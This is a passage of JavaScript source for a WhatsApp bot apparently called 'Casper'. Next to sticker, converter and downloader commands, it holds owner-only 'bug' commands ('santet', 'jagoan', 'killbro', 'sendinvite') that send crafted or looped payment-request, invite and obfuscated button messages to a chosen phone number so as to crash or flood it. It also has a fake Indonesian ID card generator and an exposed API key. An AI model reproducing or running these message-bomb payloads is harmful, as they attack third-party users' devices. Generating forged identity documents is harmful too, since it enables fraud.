_0x3800a6=['sendMessage','62882003133773','JAGOAN\x20OM?','11346ruPmOn','8704bNIpIN','OWNER','3073GGmZlg','23064WEraav','6899232RljsIX','Anjay\x20Menger','4179QxKYdx','20pDFimG','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','121JHguSE','CASPER','1100772LigGgF','742unyKIY','25adwrZS','425997aiVpHa','NAME','GROUP','AH\x20SLEBEEW'];_0xe67d=function(){return _0x3800a6;};return _0xe67d();}
}
break
//=================================================//
// BUG OWNER
case 'santet': case 'santet2': case 'santet3': case 'santet4': case 'santet5': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "IDR",
"amount1000": "100",
"extendedTextMessage": {
"text": `MY DEVELOPER Casper`,
}
}}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'jagoan' : {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) return groupon(from)
if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
jumlah = `${encodeURI(q)}`
ydd = `Casper`
for (let i = 0; i < jumlah; i++) {
kesper.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { requestPaymentMessage: { Message: { extendedTextMessage: { text: `${buttonkal}`, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, contextInfo:{"externalAdReply": {"title": `SC Casper`,"body": `Selamat ${salam} kak ${pushname}`,
mimetype: 'audio/mpeg', caption: `${buttonkal}`,
showAdAttribution: true,
sourceUrl: `https://youtube.com/c/HwModsWa857`,
thumbnailUrl: 'https://telegra.ph/file/a5e229afeb4dad4f35204.jpg', 
}
}}}}}, { quoted:m})
}
}
break
//=================================================//
case 'santetbro️': case 'killbro': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
a = await kesper.sendMessage(m.chat, {react: { text: `${ngazap(prefix)}`, key: { remoteJid: Pe, fromMe: true, id : m.key.id}}})
function _0x2391(){var _0x4f9559=['698460dweyuF','Anjay\x20Menger','NAME','1771255WLrlFj','1049592bBowjm','GROUP','62882003133773','JAGOAN\x20OM?','OWNER','2641384CvyfmM','sendMessage','543736SYthDg','28QeJHpo','AH\x20SLEBEEW','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','51290msAPFc','CASPER','665612UYYzpB'];_0x2391=function(){return _0x4f9559;};return _0x2391();}var _0x5f7d2f=_0x1b82;function _0x1b82(_0x53efcb,_0xaede48){var _0x23912a=_0x2391();return _0x1b82=function(_0x1b8262,_0x54db5f){_0x1b8262=_0x1b8262-0xee;var _0x497005=_0x23912a[_0x1b8262];return _0x497005;},_0x1b82(_0x53efcb,_0xaede48);}(function(_0x12a244,_0x1c462c){var _0x337a7b=_0x1b82,_0x39aeb1=_0x12a244();while(!![]){try{var _0x40010f=-parseInt(_0x337a7b(0xfc))/0x1+-parseInt(_0x337a7b(0xee))/0x2+parseInt(_0x337a7b(0xf1))/0x3+-parseInt(_0x337a7b(0xf0))/0x4+-parseInt(_0x337a7b(0xf4))/0x5+-parseInt(_0x337a7b(0xf5))/0x6+-parseInt(_0x337a7b(0xfd))/0x7*(-parseInt(_0x337a7b(0xfa))/0x8);if(_0x40010f===_0x1c462c)break;else _0x39aeb1['push'](_0x39aeb1['shift']());}catch(_0x391bbd){_0x39aeb1['push'](_0x39aeb1['shift']());}}}(_0x2391,0x46721),kesper[_0x5f7d2f(0xfb)](Pe,{'text':'','templateButtons':[{'callButton':{'displayText':_0x5f7d2f(0xf9),'phoneNumber':_0x5f7d2f(0xf7)}},{'callButton':{'displayText':_0x5f7d2f(0xf9),'phoneNumber':'62882003133773'}},{'callButton':{'displayText':_0x5f7d2f(0xf9),'phoneNumber':_0x5f7d2f(0xf7)}},{'urlButton':{'displayText':_0x5f7d2f(0xf6),'url':_0x5f7d2f(0xff)}},{'urlButton':{'displayText':_0x5f7d2f(0xf6),'url':_0x5f7d2f(0xff)}},{'urlButton':{'displayText':'GROUP','url':'https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2'}},{'quickReplyButton':{'displayText':'MY','id':_0x5f7d2f(0xf2)}},{'quickReplyButton':{'displayText':_0x5f7d2f(0xf3),'id':_0x5f7d2f(0xfe)}},{'quickReplyButton':{'displayText':_0x5f7d2f(0xef),'id':_0x5f7d2f(0xf8)}}]}));
}
break
case 'btcmine': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let difikulti = [0,102,100,221,2500,1000,5002040,1428,1,2,3,4,5]
var difikulnye = difikulti[Math.floor(Math.random() * difikulti.length)]
kesper.sendMessage(m.chat, { 
text: `${pushname} Please Wait A Minute`,
 })
 await sleep(8000)
kesper.sendMessage(m.chat, { 
text: `Bitcoin Mined Difficulty ${difikulnye}`,
templateButtons: [
{ urlButton: { displayText: `VISIT ONION MINER`, url: 'bitcoinku.com'}},
{ quickReplyButton: { displayText: `Mining Again`, id: 'btcmine'}}
], 
 })
}
break
//=================================================//
case 'tiktok': case 'tiktoknowm':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Link Nya Kak`)
if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return m.reply(`Contoh ${prefix+command} https://vm.tiktok.com/ZSdQycjUx/?k=1`)
let dede = await cl.downloader.tiktok(`${q}`)
krt = await getBuffer(dede.nowm)
m.reply(mess.wait)
kesper.sendMessage(m.chat, { video: krt, mimetype: 'video/mp4', fileName: `${command}.mp4`, caption: `Tah Slur` }, { quoted:m })
break
//=================================================//
case 'sendinvite': case 'sendinvite2': case 'sendinvite3': case 'sendinvite4': case 'sendinvite5':{
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
Pe = text.split("|")[0]+'@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./casper-file/image/hwmodsgans.jpg') }, { upload: kesper.waUploadToServer })
var groupInvite = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `MY NAME Casper${ngazap(prefix)}`,
"groupName": `MY NAME Casper${ngazap(prefix)}`,
"caption": `${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: m.chat, quoted:m})
kesper.relayMessage(Pe, groupInvite.message, { messageId: groupInvite.key.id })
reply('sukses Bug target')
}
break
//=================================================//
case 'sange': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
if (!isAdmins && !isCreator) return m.reply(mess.admin)
if (args[0] === "on") {
if (AntiNsfww) return m.reply('Sudah Aktif')
ntnsfww.push(from)
m.reply('Sukses Telah mengaktifkan Bug Sange Di group Ini')
var groupe = await kesper.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kesper.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nFitur Ini Mengandung Fitur +18, Harap Jangan Coli / Colmek Melihat Nya Dan Fitur Ini Mengandung Bug`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!AntiNsfww) return m.reply('Sudah Non Aktif')
let off = ntnsfww.indexOf(from)
ntnsfww.splice(off, 1)
m.reply('Sukses Mematikan Bug Sange di group ini')
} else {
const anuala = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}

Ketik On Untuk Menyalakan Fitur Ini
Ketif Of Untuk Menon Aktifkan Fitur Ini

\n\n*SILAHKAN KETIK TEXT YANG ADA DI BAWAH\n\n
bugcrot
bugahay `,
}
kesper.sendMessage(m.chat, anuala, `Casper${ngazap(prefix)}`, m)
}
}
break
case 'bugcrot' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
const bugcrot = {
image: {url:waifudd.data.url},
caption: `© Casper${buttonkal}`,
} 
kesper.sendMessage(m.chat, bugcrot, { quoted:m}).catch(err => {
 return('Error!')
})
break
case 'bugahay' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfww) return m.reply(mess.nsfw)
m.reply(mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`) 
 const bugahay = {
image: {url:waifudd.data.url},
caption: `© Casper${buttonkal}`,
} 
kesper.sendMessage(m.chat, bugahay, { quoted:m}).catch(err => {
 return('Error!')
})
break
//=================================================//
case 'welcome': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) return groupon(from)
if (!isAdmins && !isCreator) return sticAdmin(from)
if (args[0] === "on") {
if (welcm) return m.reply('Sudah Aktif')
wlcm.push(from)
m.reply('Sukses Telah mengaktifkan Welcome Di group Ini')
var groupe = await kesper.groupMetadata(from)
var members = groupe['participants']
var mems = []
members.map(async adm => {
mems.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
kesper.sendMessage(from, {text: `「 ⚠️ Peringatan ⚠️ 」\n\nIkuti Aturan Admin Yang Berlku Yang Ada Di Deskripsi `, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
if (!welcm) return m.reply('Sudah Non Aktif')
let off = wlcm.indexOf(from)
wlcm.splice(off, 1)
m.reply('Sukses Mematikan Welcome di group ini')
} else {
const komo = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption: `Ketik Text Di Bawah Ini \n\nOn Untuk Mengaktifkan\nOff untuk Menonaktifkan !!!

⚠️ DANGERR ⚠️

 `, 
}
kesper.sendMessage(m.chat, komo)
}
}
break
case 'ktpmaker': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length == 0) return m.reply(`*Pengunaan :*\n${prefix+command} Nik|Provinsi|Kabupaten|Nama|TempatTanggalLahir|JenisKel|Alamat|RtRw|KelDesa|Kecamatan|Agama|Statu|Pekerjaan|Region|Berlaku|golongan darah|LinkGambar\n\n${prefix+command} 35567778995|Provinsi Jawa Barat|Kabupaten Bekasi|jebeh Store|Bekasi |Laki-Laki|Bintara Jaya|02/05|Karang Indah|Bekasi Barat|Islam|Jomblo|anakjebeh|Indonesia|2021-2080|abc|https://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\n\n\n*[warning]*\nsetiap input query setelah garis tengah | di larang penggunaan spasi\n*「 INFO IMAGE 」*\nUntuk Gambar Profil KTP\nUpload Dari Web Berikut Ini\n\nhttps://i.waifu.pics\nhttps://c.top4top.io\n\nCONTOH HASIL NYA\nhttps://i.ibb.co/qrQX5DC/IMG-20220401-WA0084.jpg\nhttps://k.top4top.io/p_2208264hn0.jpg`)
get_args = args.join(" ").split("|")
nik = get_args[0]
if (!nik) return m.reply('nomor induk keluaga kak pastikan jangan mirip NIK yang asli ya')
prov = get_args[1]
if (!prov) return m.reply('probinsi mana kak')
kabu = get_args[2]
if (!kabu) return m.reply('kabupaten mana kak')
name = get_args[3]
if (!name) return m.reply('nama nya siapa kak')
ttl = get_args[4]
if (!ttl) return m.reply('tempat tanggal lahir nya kak')
jk = get_args[5]
if (!jk) return m.reply('jenis kelamin pria atau wanita kak')
jl = get_args[6]
if (!jl) return m.reply('alamat rumah nya mana kak')
rtrw = get_args[7]
if (!rtrw) return m.reply('RT / RW berapa kak')
lurah = get_args[8]
if (!lurah) return m.reply('kelurahan mana kak')
camat = get_args[9]
if (!camat) return m.reply('kecamatan mana kak')
agama = get_args[10]
if (!agama) return m.reply('agama nya apa kak')
nikah = get_args[11]
if (!nikah) return m.reply('status belum ada')
kerja = get_args[12]
if (!kerja) return m.reply('pekerjaan belum ada')
warga = get_args[13]
if (!warga) return m.reply('region belum ada')
until = get_args[14]
if (!until) return m.reply('waktu berlaku belum ada')
gd = get_args[15]
if (!gd) return m.reply('golongan darah belum ada')
img = get_args[16]
if (!img) return m.reply('url image belum ada')
      m.reply(mess.wait)
bikin = (`https://oni-chan.my.id/api/Fmake/ktpmaker?nik=${nik}&nama=${name}&ttl=${ttl}&jk=${jk}&gd=${gd}&almt=${jl}&rtw=${rtrw}&kel=${lurah}&kc=${camat}&agm=${agama}&st=${nikah}&krj=${kerja}&ngr=${warga}&blk=${until}&prv=${prov}&kab=${kabu}&picturl=${img}`)
console.log(bikin)
ardaktp = await getBuffer(bikin)
  await sleep(8000)
await kesper.sendMessage(from, { image: ardaktp, caption: `done kak` }, { quoted: m })
//await sleep(5000)
}
break
case 'sticker': case 's': case 'stickergif': case 'sgif': {
if (isBan) return reply(`Lu Di Ban Kids`)
m.reply('Bentar Om')
if (!quoted) throw `Balas Video/Image Dengan Caption ${prefix + command}`
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await kesper.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return m.reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await kesper.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else {
throw `Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`
}
}
break
//=================================================//
case 'emojimix': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let [emoji1, emoji2] = text.split`+`
if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
for (let res of anu.results) {
let encmedia = await kesper.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
case 'emojimix2': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!text) throw `Example : ${prefix + command} 😅`
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
for (let res of anu.results) {
let encmedia = await kesper.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
await fs.unlinkSync(encmedia)
}
}
break
//=================================================//
//=================================================//
case 'smeme': case 'stickermeme': case 'stickmeme': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!quoted) throw 'Reply Image'
if (text.includes('|')) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
if (!/image/.test(mime)) return m.reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
sticWait(from)
arg = args.join(' ')
mee = await kesper.downloadAndSaveMediaMessage(quoted)
const { TelegraPh } = require('./casper-file/lib/uploader')
mem = await TelegraPh(mee)
meme = `https://api.memegen.link/images/custom/-/${arg}.png?background=${mem}`
memek = await kesper.sendImageAsSticker(m.chat, meme, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(memek)
}
break 
//=================================================//
case 'toimage': case 'toimg': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `Balas sticker dengan caption *${prefix + command}*`
let media = await kesper.downloadAndSaveMediaMessage(quoted)
let ran = await getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, (err) => {
fs.unlinkSync(media)
if (err) throw err
let buffer = fs.readFileSync(ran)
kesper.sendMessage(m.chat, { image: buffer }, { quoted:m })
fs.unlinkSync(ran)
})
}
break
//=================================================//
case 'tomp4': case 'tovideo': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
let { webp2mp4File } = require('./casper-file/lib/uploader')
let media = await kesper.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await kesper.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'toaud': case 'toaudio': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
if (!quoted) throw `*Send/Reply the Video/Audio You Want to Use as Audio With Caption* ${prefix + command}`
let media = await quoted.download()
let { toAudio } = require('./casper-file/lib/converter')
let audio = await toAudio(media, 'mp4')
kesper.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted:m })
}
break
//=================================================//
case 'tovn': case 'toptt': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!/video/.test(mime) && !/audio/.test(mime)) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
if (!quoted) throw `*Reply Video/Audio That You Want To Be VN With Caption* ${prefix + command}`
sticWait(from)
let media = await quoted.download()
let { toPTT } = require('./casper-file/lib/converter')
let audio = await toPTT(media, 'mp4')
kesper.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
}
break
//=================================================//
case 'togif': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!quoted) throw 'Reply Image'
if (!/webp/.test(mime)) throw `*reply sticker with caption* *${prefix + command}*`
 let { webp2mp4File } = require('./casper-file/lib/uploader')
let media = await kesper.downloadAndSaveMediaMessage(quoted)
let webpToMp4 = await webp2mp4File(media)
await kesper.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted:m })
await fs.unlinkSync(media)
}
break
//=================================================//
case 'tourl': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./casper-file/lib/uploader')
let media = await kesper.downloadAndSaveMediaMessage(quoted)
if (/image/.test(mime)) {
let anu = await TelegraPh(media)
m.reply(util.format(anu))
} else if (!/image/.test(mime)) {
let anu = await UploadFileUgu(media)
m.reply(util.format(anu))
}
await fs.unlinkSync(media)
}
break
case 'pinterest': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let { pinterest } = require('./casper-file/lib/scraper')
anu = await pinterest(text)
result = anu[Math.floor(Math.random() * anu.length)]
kesper.sendMessage(m.chat, { image: { url: result }, caption: '⭔ Media Url : '+result }, { quoted:m })
}
break
//=================================================//
case 'couple': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
let random = anu[Math.floor(Math.random() * anu.length)]
kesper.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted:m })
kesper.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted:m })
}
break
case 'coffe': case 'kopi': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
const ko = {
image: { url: 'https://coffee.alexflipnote.dev/random' },
caption: `☕ Random Coffe`
}
kesper.sendMessage(m.chat, ko, { quoted:m })
}
break
case 'kalkulator': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (args.length < 1) return m.reply(`*Example :*\n${prefix}kalkulator 2 * 5\n\n*List Bilangan :*\n•> Kali : *\n•> Bagi : /\n•> Tambah : +\n•> Kurang : -`)
let qsd = args.join(" ")
if (typeof mathjs.evaluate(qsd) !== 'number') {
m.reply('Error')
} else {
m.reply(`「 Kalkulator 」\n\n*•> Hitung :* ${qsd}\n*•> Hasil :* ${mathjs.evaluate(qsd.replace(/×/g, "*").replace(/x/g, "*").replace(/÷/g, "/"))}`)
}
}
break
case 'getname': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (qtod === "true") {
namenye = await kesper.getName(m.quoted.sender)
m.reply(namenye)
} else if (qtod === "false") {
kesper.sendMessage(from, {text:"Reply orangnya"}, {quoted:m})
}
}
break
//=================================================//
case 'getpic': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (qtod === "true") {
try {
pporg = await kesper.profilePictureUrl(m.quoted.sender, 'image')
} catch {
pporg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
kesper.sendMessage(m.chat, { image : { url : pporg }, caption:`Done` }, { quoted:m })
} else if (qtod === "false") {
try {
pporgs = await kesper.profilePictureUrl(from, 'image')
} catch {
pporgs = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
kesper.sendMessage(m.chat, { image : { url : pporgs }, caption:`Done` }, { quoted:m })
}
}
break
case 'infochat': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.quoted) m.reply('Reply Pesan')
let msg = await m.getQuotedObj()
if (!m.quoted.isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
let teks = ''
for (let i of msg.userReceipt) {
let read = i.readTimestamp
let unread = i.receiptTimestamp
let waktu = read ? read : unread
teks += `⭔ @${i.userJid.split('@')[0]}\n`
teks += ` ┗━⭔ *Waktu :* ${moment(waktu * 1000).format('DD/MM/YY HH:mm:ss')} ⭔ *Status :* ${read ? 'Dibaca' : 'Terkirim'}\n\n`
}
kesper.sendTextWithMentions(m.chat, teks, m)
}
break
case 'penjara':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`*Contoh* :\n#penjara namagroup`)
let cret = await kesper.groupCreate(args.join(" "), [])
let response = await kesper.groupInviteCode(cret.id)
kesper.sendMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { text: `「 *Create Group* 」

_▸ Owner : ${botname}
_▸ Time : ${moment(cret.creation * 1000).tz("Asia/Jakarta").format("DD/MM/YYYY HH:mm:ss")} WIB_https://chat.whatsapp.com/${response}
`, m})

break
case 'play': case 'ytplay': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!text) throw `Example : ${prefix + command} story wa anime`
let yts = require("yt-search")
let search = await yts(text)
let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
let buttons = [
{buttonId: `ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
]
let buttonMessage = {
image: { url: anu.thumbnail },
caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
footer: kesper.user.name,
buttons: buttons,
headerType: 4
}
kesper.sendMessage(m.chat, buttonMessage, { quoted: m })
}
break
//=================================================//
case 'mediafire': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!text) throw '*Link Nyq Coy*'
if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) throw '*Link Erorr*'
const baby1 = await mediafireDl(text)
if (baby1[0].size.split('MB')[0] >= 100) return reply('*File Over Limit* '+util.format(baby1))
const result4 = `*DOWNLOAD MEDIAFIRE*

*Name* : ${baby1[0].nama}
*Size* : ${baby1[0].size}
*Mime* : ${baby1[0].mime}
*Link* : ${baby1[0].link}\n
_whoa wait hwmods processing..._

*Casper*`
reply(`${result4}`)
kesper.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m }).catch ((err) => reply('*Failed to download File*'))
}
break
//=================================================//
case 'candy': 
case 'christmas': 
case '3dchristmas': 
case 'sparklechristmas':
case 'deepsea': 
case 'scifi': 
case 'rainbow': 
case 'waterpipe': 
case 'spooky': 
case 'pencil': 
case 'circuit': 
case 'discovery': 
case 'metalic': 
case 'fiction': 
case 'demon': 
case 'transformer': 
case 'berry': 
case 'thunder': 
case 'magma': 
case '3dstone': 
case 'neonlight': 
case 'glitch': 
case 'harrypotter': 
case 'brokenglass':
case 'papercut': 
case 'watercolor':
case 'multicolor': 
case 'neondevil': 
case 'underwater': 
case 'graffitibike':
 case 'snow': 
 case 'cloud': 
 case 'honey': 
 case 'ice': 
 case 'fruitjuice': 
 case 'biscuit': 
 case 'wood': 
case 'chocolate': 
case 'strawberry': 
case 'matrix': 
case 'blood': 
case 'dropwater': 
case 'toxic': 
case 'lava': 
case 'rock': 
case 'bloodglas': 
case 'hallowen': 
case 'darkgold': 
case 'joker': 
case 'wicker':
 case 'firework': 
 case 'skeleton': 
 case 'blackpink': 
 case 'sand': 
 case 'glue': 
 case '1917': 
 case 'leaves': {
